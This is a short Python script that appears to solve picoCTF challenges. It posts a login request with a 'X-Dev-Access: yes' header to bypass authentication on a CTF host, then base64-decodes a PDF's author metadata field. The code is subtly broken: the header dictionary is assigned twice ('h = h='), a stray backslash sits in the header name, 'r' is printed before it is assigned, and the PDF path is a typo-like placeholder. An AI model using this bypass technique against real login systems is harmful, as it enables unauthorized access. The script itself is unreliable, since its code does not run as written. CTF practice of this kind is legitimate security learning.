import requests
import base64
from pypdf import PdfReader
# crack the gate:
PORT=6666 # insert the right port here 
url = f'http://amiable-citadel.picoctf.net:{PORT}'
h = h={'Content-Type': 'application/json', 'X-Dev-Acc\ess':'yes'}
payload={'email':'ctf-player@picoctf.org', 'password':'PASSWORD'}
requests.post(url,json=payload,headers=h)
print(r.status_code)
print(r.text)

# read pdf metadata and decode it from base64
r = PdfReader('path_t_pdf')
meta = r.metadata
print(meta)
d = meta.author
print(base64.b64decode(d))

